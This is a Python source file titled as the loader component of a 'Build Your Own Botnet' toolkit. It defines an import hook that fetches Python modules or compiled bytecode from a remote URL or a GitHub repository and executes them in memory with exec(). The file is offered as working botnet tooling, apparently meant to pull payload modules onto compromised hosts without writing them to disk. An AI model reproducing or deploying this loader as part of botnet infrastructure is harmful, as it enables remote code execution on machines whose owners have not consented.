#!/usr/bin/python
# -*- coding: utf-8 -*-
'Loader (Build Your Own Botnet)'

# standard library
import imp
import sys
import logging
import contextlib
if sys.version_info[0] < 3:
    from urllib2 import urlopen
else:
    from urllib.request import urlopen

def log(info='', level='debug'):
    logging.basicConfig(level=logging.DEBUG, handlers=[logging.StreamHandler()])
    logger = logging.getLogger(__name__)
    getattr(logger, level)(str(info)) if hasattr(logger, level) else logger.debug(str(info))

# main
class Loader(object):
    """
    The class that implements the remote import API.
    :param list modules: list of module/package names to make available for remote import
    :param str base_url: URL of directory/repository of modules being served through HTTPS

    """

    def __init__(self, modules, base_url):
        self.module_names = modules
        self.base_url = base_url + '/'
        self.non_source = False
        self.reload = False
        '''
        self.mod_msg = {}
        '''

    def find_module(self, fullname, path=None):
        log(level='debug', info= "FINDER=================")
        log(level='debug', info= "Searching: %s" % fullname)
        log(level='debug', info= "Path: %s" % path)
        log(level='info', info= "Checking if in declared remote module names...")
        if fullname.split('.')[0] not in self.module_names + list(set([_.split('.')[0] for _ in self.module_names])):
            log(level='info', info= "[-] Not found!")
            return None
        log(level='info', info= "Checking if built-in....")
        try:
            file, filename, description = imp.find_module(fullname.split('.')[-1], path)
            if filename:
                log(level='info', info= "[-] Found locally!")
                return None
        except ImportError:
            pass
        log(level='info', info= "Checking if it is name repetition... ")
        if fullname.split('.').count(fullname.split('.')[-1]) > 1:
            log(level='info', info= "[-] Found locally!")
            return None
        '''
        msg = self.__get_source(fullname,path)
        if msg==None:
            return None
        is_package,final_url,source_code=msg
        self.mod_msg.setdefault(fullname,MsgClass(is_package,final_url,source_code))
        '''
        log(level='info', info= "[+] Module/Package '%s' can be loaded!" % fullname)
        return self

    def load_module(self, name):
        '''
        mod_msg=self.mod_msg.get(fullname)
        '''
        imp.acquire_lock()
        log(level='debug', info= "LOADER=================")
        log(level='debug', info= "Loading %s..." % name)
        if name in sys.modules and not self.reload:
            log(level='info', info= '[+] Module "%s" already loaded!' % name)
            imp.release_lock()
            return sys.modules[name]
        if name.split('.')[-1] in sys.modules and not self.reload:
            log(level='info', info= '[+] Module "%s" loaded as a top level module!' % name)
            imp.release_lock()
            return sys.modules[name.split('.')[-1]]
        module_url = self.base_url + '%s.py' % name.replace('.', '/')
        package_url = self.base_url + '%s/__init__.py' % name.replace('.', '/')
        zip_url = self.base_url + '%s.zip' % name.replace('.', '/')
        final_url = None
        final_src = None
        try:
            log(level='debug', info= "Trying to import '%s' as package from: '%s'" % (name, package_url))
            package_src = None
            if self.non_source:
                package_src = self.__fetch_compiled(package_url)
            if package_src == None:
                package_src = urlopen(package_url).read()
            final_src = package_src
            final_url = package_url
        except IOError as e:
            package_src = None
            log(level='info', info= "[-] '%s' is not a package (%s)" % (name, str(e)))
        if final_src == None:
            try:
                log(level='debug', info= "[+] Trying to import '%s' as module from: '%s'" % (name, module_url))
                module_src = None
                if self.non_source:
                    module_src = self.__fetch_compiled(module_url)
                if module_src == None:
                    module_src = urlopen(module_url).read()
                final_src = module_src
                final_url = module_url
            except IOError as e:
                module_src = None
                log(level='info', info= "[-] '%s' is not a module (%s)" % (name, str(e)))
                imp.release_lock()
                return None
        log(level='debug', info= "[+] Importing '%s'" % name)
        mod = imp.new_module(name)
        mod.__loader__ = self
        mod.__file__ = final_url
        if not package_src:
            mod.__package__ = name.rpartition('.')[0]
        else:
            mod.__package__ = name
            mod.__path__ = ['/'.join(mod.__file__.split('/')[:-1]) + '/']
        log(level='debug', info= "[+] Ready to execute '%s' code" % name)
        sys.modules[name] = mod
        exec(final_src, mod.__dict__)
        log(level='info', info= "[+] '%s' imported succesfully!" % name)
        imp.release_lock()
        return mod
    
    '''
    def __get_source(self,fullname,path):
        url=self.baseurl+"/".join(fullname.split("."))
        source=None
        is_package=None
        
        # Check if it's a package
        try:
            final_url=url+"/__init__.py"
            source = urlopen(final_url).read()
            is_package=True
        except Exception as e:
            log(level='debug', info= "[-] %s!" %e)
            
        # A normal module
        if is_package == None :  
            try:
                final_url=url+".py"
                source = urlopen(final_url).read()
                is_package=False
            except Exception as e:
                log(level='debug', info= "[-] %s!" %e)
                return None
                
        return is_package,final_url,source
    '''
    
    def __fetch_compiled(self, url):
        import marshal
        module_src = None
        try:
            module_compiled = urlopen(url + 'c').read()
            try:
                module_src = marshal.loads(module_compiled[8:])
                return module_src
            except ValueError:
                pass
            try:
                module_src = marshal.loads(module_compiled[12:])  # Strip the .pyc file header of Python 3.3 and onwards (changed .pyc spec)
                return module_src
            except ValueError:
                pass
        except IOError as e:
            log(level='debug', info= "[-] No compiled version ('.pyc') for '%s' module found!" % url.split('/')[-1])
        return module_src

def __create_github_url(username, repo, branch='master'):
    github_raw_url = 'https://raw.githubusercontent.com/{user}/{repo}/{branch}/'
    return github_raw_url.format(user=username, repo=repo, branch=branch)

def _add_git_repo(url_builder, username=None, repo=None, module=None, branch=None, commit=None):
    if username == None or repo == None:
        raise Exception("'username' and 'repo' parameters cannot be None")
    if commit and branch:
        raise Exception("'branch' and 'commit' parameters cannot be both set!")
    if commit:
        branch = commit
    if not branch:
        branch = 'master'
    if not module:
        module = repo
    if type(module) == str:
        module = [module]
    url = url_builder(username, repo, branch)
    return add_remote_repo(module, url)

def add_remote_repo(modules, base_url='http://localhost:8000/'):
    """
    Function that creates and adds to the 'sys.meta_path' an Loader object.
    The parameters are the same as the Loader class contructor.
    """
    importer = Loader(modules, base_url)
    sys.meta_path.insert(0, importer)
    return importer

def remove_remote_repo(base_url):
    """
    Function that removes from the 'sys.meta_path' an Loader object given its HTTP/S URL.
    """
    for importer in sys.meta_path:
        try:
            if importer.base_url.startswith(base_url):  # an extra '/' is always added
                sys.meta_path.remove(importer)
                return True
        except AttributeError as e: pass
    return False

@contextlib.contextmanager
def remote_repo(modules, base_url='http://localhost:8000/'):
    """
    Context Manager that provides remote import functionality through a URL.
    The parameters are the same as the Loader class contructor.
    """
    importer = add_remote_repo(modules, base_url)
    yield
    remove_remote_repo(base_url)

@contextlib.contextmanager
def github_repo(username=None, repo=None, module=None, branch=None, commit=None):
    """
    Context Manager that provides import functionality from Github repositories through HTTPS.
    The parameters are the same as the '_add_git_repo' function. No 'url_builder' function is needed.
    """
    importer = _add_git_repo(__create_github_url,
        username, repo, module=module, branch=branch, commit=commit)
    yield
    remove_remote_repo(importer.base_url)
